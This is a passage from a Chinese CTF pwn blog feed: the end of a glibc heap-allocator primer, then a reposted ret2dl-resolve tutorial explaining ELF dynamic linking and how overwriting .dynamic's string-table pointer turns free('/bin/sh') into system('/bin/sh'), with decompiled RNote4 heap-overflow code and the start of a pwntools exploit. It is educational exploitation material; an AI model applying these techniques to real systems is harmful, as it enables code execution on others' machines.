alt></p><p>代码提供了最基本的增删查改的功能。这个”笔记”的数据结构<strong>通常就是使用链表连接起来的</strong>，记录了当前 note 的大小、属性、内容等等。</p><p><strong>例如，下面这个例子就是以指针为基础来存储这个 note 结构的</strong>。这里的 i 代表 note 的索引，若这里的 i = 0 时：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/05.png" alt></p><p><em>(qword_6020A8 + 16) 就*代表从 qword_6020A8 这个地址出再往后偏移 16 个字节，取到这个地址存储的值，接着把 1 赋值给这个地方（也就是把 1 存入这个地址）</em></p><p>同样的 *(qword_6020A8 + 24) 就代表偏移 24 个字节处的值为 len</p><p>依次类推就可以在<strong>不连续的内存空间中</strong>，把整个 note 的数据结构存储下来了。</p><h2 id="申请堆块的本质"><a href="#申请堆块的本质" class="headerlink" title="申请堆块的本质"></a>申请堆块的本质</h2><blockquote><p>堆管理器 ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块</p></blockquote><p>ptmalloc2 的作用通俗的讲就是<strong>相当于一个”中间商”</strong>，在程序想要申请向系统申请堆空间时，这里的 ptmalloc2 就会申请一块很大的空间，并根据算法从这些内存中把空间真正的分配给程序。</p><p>简单点说就是下面这个图中的情况：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/06.png" alt></p><p>这里的举一个最简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 gdb 中进行调试，在<code>call malloc</code>处下一个断点，<strong>在这里使用 vmmap 命令，查看内存分布</strong>。可以看到此时并没有发现堆段</p><p>在 gdb 中进行调试，在 call malloc 处下一个断点，<strong>在这里使用 vmmap 命令，查看内存分布</strong>。可以看到此时并没有发现堆段</p><p>单步 n ，vmmap 命令再次查看内存，发现出现了堆段</p><p>但是这里我们明明只是申请了 10 字节的大小，但是为什么这里的为什么给了这么大的堆段呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00602000     ~    0x00623000</span><br></pre></td></tr></table></figure><p>计算一下，刚好是 132 kB</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x00623000-0x00602000)/1024 = 132 kB</span><br></pre></td></tr></table></figure><blockquote><p>原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以这个区域叫做 main arena</p></blockquote><p>也就是说这 132 KB 是”厂家”（内核）批发给”中间商”（ptmalloc2）的货物，<strong>以便下次程序在向系统申请小内存的时候，直接去”中间商”去取就行了</strong>，他就会在这 132KB 中按照要申请”货物”的多少进行分配下去。若”中间商”缺货了话，ptmalloc2 就继续去找”厂家”（系统内核）去取货</p><h3 id="查看已分配的堆内存分布"><a href="#查看已分配的堆内存分布" class="headerlink" title="查看已分配的堆内存分布"></a>查看已分配的堆内存分布</h3><p>在上面我们动态调试的时候已经执行了 malloc 函数，申请到的堆指针是保存在 eax 中的</p><p>我们这里使用下面这个命令来查看内存堆块情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/32gx 0x602010-0x10</span><br></pre></td></tr></table></figure><ul><li>32位的程序使用 x/32xw 比较直观一点</li></ul><p>这里减去 0x10 表示从堆块的头部开始观察（包含 pre size 和 size 字段）</p><h2 id="main-arena-与-top-chunk"><a href="#main-arena-与-top-chunk" class="headerlink" title="main_arena 与 top chunk"></a>main_arena 与 top chunk</h2><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><p>这个 main_arena 其实就是 ptmalloc2 堆管理器通过与操作系统内核进行交互申请到的，也就是相当于上面所说的”批发”到的一堆货物</p><blockquote><p>因为是主线程分配的，所以叫做main arena，通过增加 program break location 的方式来增加 main arena 的大小。</p></blockquote><p><strong>使用 brk 方式扩展内存的方式这里就不说了，感兴趣可以自己去查一下资料</strong></p><p>在 gdb 调试中，使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/32gx &amp;main_arena</span><br></pre></td></tr></table></figure><p>可以看到 main_arena 的内存分配情况。</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>顾名思义，是堆中第一个堆块。相当于一个”带头大哥”，程序以后分配到的内存到要放在他的后面。</p><blockquote><p>在系统当前的所有 free chunk(无论那种 bin)，都无法满足用户请求的内存大小的时候，将此 chunk 当做一个应急消防员，分配给用户使用。</p></blockquote><p>简单点说，也就是在程序在向堆管理器申请内存时，<strong>没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他</strong></p><h2 id="free-函数和-bins"><a href="#free-函数和-bins" class="headerlink" title="free 函数和 bins"></a>free 函数和 bins</h2><p>bins 这个概念是与内存回收相关的，也就是堆管理器会根据用户已经申请到的内存空间大小进行释放，<strong>来决定放入哪类 bins 当作去</strong>。bins 直接翻译过来就是”垃圾桶”的意思，所以在系统在决定使用哪个 bins 时可以看作为”垃圾的分类”。</p><p>主要的 bins 分为以下几类，这里重点讲解一下 fast bin，因为 fast bin 是使用到的最多的一类，也是其中结构最为简单的。</p><h3 id="free-函数"><a href="#free-函数" class="headerlink" title="free 函数"></a>free 函数</h3><p>free 函数的使用是和 bins 的分配息息相关的。用一个简单的例子来理解一下 free 函数的实现原理。</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(p,<span class="string">"Hello"</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>程序将 “Hello” 字符串复制到申请到的堆内存空间中。</li></ul><p>编译后用 gdb 调试，在 call memcpy 处下一个断点，单步后将 “Hello” 复制到堆块中</p><p>继续使用 x/32gx 0x602010-0x10 命令查看堆块情况</p><p>继续单步 n，执行 free 函数之后，查看堆块情况</p><p>这里可以看出原本堆块中存储的内容已经被清空，然后<strong>查看一下 main_arena 的值，发现其中 +0x8 的偏移处</strong>，存储了指向已经 free 了的指针（指向头部，而不是 user data）</p><p><strong>小总结</strong></p><p>所以调用 free 函数以后程序做了两件事：<br><strong>1.清空此堆块的 user data2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</strong></p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>顾名思义，就是为了快速重新分配回内存而存在的一个结构。</p><blockquote><p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p></blockquote><p>引用一张图：</p><ul><li>这里的横向排列的就是 main_arene（fast bin）的内存地址</li></ul><p>假如此时 0x0804a000 处的堆块（实际堆块中的 size 字段要减去 PREV_INUSE 字段值 1，）已经被 free 了，那么他就会被存储<strong>在表示 40 bytes 的 fast bin 的内存地址里</strong></p><ul><li>注意：<strong>这里把指针和地址区别开。地址存储的是指针，64 位的指针占 8 个字节</strong>。</li></ul><p><strong>假设我们现在还是以 64 位下的 malloc(10) 为例子。</strong></p><p>根据前面那个 free 函数的例子，查看 main_arena 地址中的指针值我们可以看出来，<strong>+0x8 偏移处才是指向 malloc(10) 的堆块的指针</strong>（这个堆块分配后的 user data 实际大小是 16 字节）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> x/2gx &amp;main_arena                           (16 bytes 的链表头)</span><br><span class="line">0x7ffff7dd3760 &lt;main_arena&gt;:    0x0000000000000000    0x0000000000602000</span><br></pre></td></tr></table></figure><p>所以这个 16 字节的堆块的指针会被插入属于他的这个链表队列中，也就是如下的情况。</p><p>所以这也就印证了在 <strong>main_arena</strong> 中分别表示 <strong>16 Bytes</strong>, <strong>24 Bytes</strong>, <strong>32 Bytes</strong>, … , <strong>80 Bytes</strong> 的内存地址中分别存储着已经 <strong>free</strong> 的而且满足这个大小的 <strong>chunk</strong>的指针。</p><p><strong>fast bin 的特性</strong></p><p><strong>1.使用单链表来维护释放的堆块</strong><br>也就是和上图一样，从<strong>main_arena</strong> 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。</p><p>如下图所示，此时就是一个单链表结构</p><p><strong>2.采用后进先出的方式维护链表（类似于栈的结构）</strong><br>当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，<strong>会选择后面新加入的堆块拿来先进行内存分配</strong></p><p>如上图，如果程序重新请求和上面的堆块大小一样时候（malloc），堆管理器就会直接使用 fast bin 里的堆块。</p><p><strong>这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块</strong>，此时 main_arena 就指向了这里。也就是恢复到了上面第一个图中的情况。</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>顾名思义，这个是一个 small chunk ，满足的内存空间比 fast bin 大一点。</p><p>如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p></blockquote><ul><li>unsorted bin 与 fast bin 不同，他使用<strong>双向链表</strong>对 chunk 进行连接</li><li>unsorted 的字面意思就是”不可回收”的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个”垃圾桶”中。</li></ul><blockquote><p>参考资料：</p><p>1、CTF pwn 中最通俗易懂的堆入坑指南[<a href="https://www.anquanke.com/post/id/163971]" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163971]</a></p><p>2、浅析Linux堆溢出之fastbin[<a href="https://www.freebuf.com/news/88660.html]" target="_blank" rel="noopener">https://www.freebuf.com/news/88660.html]</a></p><p>3、CTF Wiki[]</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve详解</title>
      <link href="/2019/10/07/ret2dl-resolve%E2%95%A7%CE%A9%E2%95%9C%CE%93/"/>
      <url>/2019/10/07/ret2dl-resolve%E2%95%A7%CE%A9%E2%95%9C%CE%93/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dl-resolve详解"><a href="#ret2dl-resolve详解" class="headerlink" title="ret2dl-resolve详解"></a>ret2dl-resolve详解</h1><p>转载自看雪论坛，原文：<a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a></p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近做RCTF，结果pwn一道没做出来（虽然精力全放在更擅长的reverse上了），然后复盘的时候发现RNote4有个关于ret2dl-resolve的利用，遂在网上查之，发现很多资料讲的不是很清楚，但是还是慢慢琢磨弄懂了。这个技巧貌似是一个挺基础的技巧，玩pwn一段时间了，发现自己还有这种知识遗漏。。。所以这篇文章新手向，大神可以绕道了。。。。</p><h1 id="0x01-ELF文件格式以及动态链接"><a href="#0x01-ELF文件格式以及动态链接" class="headerlink" title="0x01 ELF文件格式以及动态链接"></a>0x01 ELF文件格式以及动态链接</h1><p>我们知道，无论是windows下还是linux下，程序想要调用其他动态链接库的函数，必须要在程序加载的时候动态链接，比方说，windows下，叫作IAT表，linux下，叫作GOT表。调用库函数时，会有个类似call  [xxx] 或者 jmp  [xxx]的指令，其中xxx是IAT表或者GOT表的地址。在这里因为是linux的pwn，我们主要讨论GOT表，以及在linux下更为常见的jmp  [xxx].</p><h2 id="linux如何调用库函数"><a href="#linux如何调用库函数" class="headerlink" title="linux如何调用库函数"></a>linux如何调用库函数</h2><p>首先一个hello world程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Pwn\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -m32 -fno-stack-protector -no-pie -s hellopwn.c</span></span><br></pre></td></tr></table></figure><p>其中，这个puts是调用的libc这个动态链接库导出的一个函数。编译它，看看puts是怎么被调用的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    offset s        ; <span class="string">"Hello Pwn\n"</span></span><br><span class="line">call    _puts ;这里调用<span class="built_in">puts</span></span><br><span class="line">_puts:</span><br><span class="line">jmp     ds:off_804A00C ; <span class="built_in">puts</span>会call到这里，这里就是“jmp [GOT表地址]”的这样一条指令</span><br></pre></td></tr></table></figure><p>跟一下，看看这个off_804A00C在<strong>第一次调用</strong>时是什么东西</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_T4GWFF2PV36ZNX8.png.jpg" alt="img"></p><p>可以发现，是0x80482e6这个地址，并不直接是libc的puts函数的地址。这是因为linux在程序加载时使用了延迟绑定(lazy  load)，只有等到这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会再push一个0，再push一个dword  ptr  [0x804a004]，待会会说这两个参数是什么意思，最后跳到libc的_dl_runtime_resolve去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是puts）的地址，然后放到相应的GOT表，并且调用它。而这个函数的地址也是从GOT表取并且jmp  [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定，如果把它也延迟绑定就会出现先有鸡还是先有蛋的问题了。</p><h2 id="ELF关于动态链接的一些关键section"><a href="#ELF关于动态链接的一些关键section" class="headerlink" title="ELF关于动态链接的一些关键section"></a>ELF关于动态链接的一些关键section</h2><p>section，segment是什么东西不说了，不知道的话呢谷歌百度一下</p><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了一些关于动态链接的关键信息，在这个hellopwn上它长这样，事实上这个section所有程序都差不多</p><p> <img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_UH6SD6XJVZW7T24.png.jpg" alt="img"></p><p>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针，可以<code>readelf -S hellopwn</code>看一下，会发现这三个section的地址跟在上图所示的地址是一样的。</p><h3 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_YBW9WNCFG6ARTBN.png.jpg" alt="img"></p><p>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是<strong>相对这个section头的偏移</strong>，比方说，在这里，就是字符串相对0x804821C的偏移。</p><h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_NQJC7WN7V477NFU.png.jpg" alt="img"></p><p>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure><h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_MBHEB59H58HGWSJ.png.jpg" alt="img"></p><p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset; //指向GOT表的指针</span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span><br><span class="line">  //1和3是这个导入函数的符号在.dynsym中的下标，</span><br><span class="line">  //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><h2 id="dl-runtime-resolve做了什么"><a href="#dl-runtime-resolve做了什么" class="headerlink" title="_dl_runtime_resolve做了什么"></a>_dl_runtime_resolve做了什么</h2><p>这个想要深入理解的话呢可以去看<code>glibc/elf/dl-runtime.c</code>的源码，这里我就不贴了，因为有一堆宏，看着让人晕，我就直接说下他做了哪些事情。</p><p>首先说第一个参数，[0x804a004]是一个<code>link_map</code>的指针，这个结构是干什么的，我们不关心，但是有一点要知道，它包含了<code>.dynamic</code>的指针，通过这个<code>link_map</code>，<code>_dl_runtime_resolve</code>函数可以访问到<code>.dynamic</code>这个section</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_YVAWY7X8YES3MCB.png.jpg" alt="img"></p><p>0x08049f14是<code>.dynamic</code>的指针，与前面图中一致；而第二个参数，是当前要调用的导入函数在<code>.rel.plt</code>中的偏移（不过64位的话就直接是index下标），比方说这里，puts就是0，<code>__libc_start_main</code>就是<code>1*sizeof(Elf32_Rel)=8</code>。</p><h3 id="dl-runtime-resolve会"><a href="#dl-runtime-resolve会" class="headerlink" title="_dl_runtime_resolve会"></a>_dl_runtime_resolve会</h3><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol><p>如果阅读libc源码的话会发现实际顺序可能跟我上面所说的有一点偏差，不过意思都一样，我这样说会比较好理解。</p><h1 id="0x02-ret2dl-resolve-利用"><a href="#0x02-ret2dl-resolve-利用" class="headerlink" title="0x02 ret2dl-resolve 利用"></a>0x02 ret2dl-resolve 利用</h1><p>那么，这个怎么去利用呢，有两种利用方式</p><h2 id="改写-dynamic的DT-STRTAB"><a href="#改写-dynamic的DT-STRTAB" class="headerlink" title="改写.dynamic的DT_STRTAB"></a>改写.dynamic的DT_STRTAB</h2><p>这个只有在checksec时<code>No RELRO</code>可行，即<code>.dynamic</code>可写。因为<code>ret2dl-resolve</code>会从<code>.dynamic</code>里面拿<code>.dynstr</code>字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够<strong>改写</strong>这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个<code>free</code>函数，我们就把原本是<code>free</code>字符串的那个偏移位置设为<code>system</code>字符串，<strong>第一次</strong>调用<code>free(&quot;bin/sh&quot;)</code>（因为只有第一次才会resolve），就等于调用了<code>system(&quot;/bin/sh&quot;)</code>。</p><p>例题就是RCTF的RNote4，题目是一道堆溢出，<code>NO RELRO</code>而且<code>NO PIE</code>溢出到后面的指针可以实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 a1; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a1 = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;a1, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[a1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3 = notes[a1];</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);                      <span class="comment">// heap overflow堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( number &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  v3 = (note *)<span class="built_in">calloc</span>(<span class="number">0x10</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3-&gt;buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1u</span>LL); <span class="comment">//堆中存放了指针，所以可以通过这个任意写</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3-&gt;buf )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);</span><br><span class="line">  v3-&gt;size = size;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  notes[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写<code>.dynamic</code>指向字符串表的指针，使其指向一块可写内存，比如<code>.bss</code>，然后再写这块内存，使得相应偏移出刚好有个<code>system\x00</code>。exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">g_local=True</span><br><span class="line">#e=ELF('./libc.so.6')</span><br><span class="line">#context.log_level='debug'</span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh =process('./RNote4')#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span><br><span class="line">    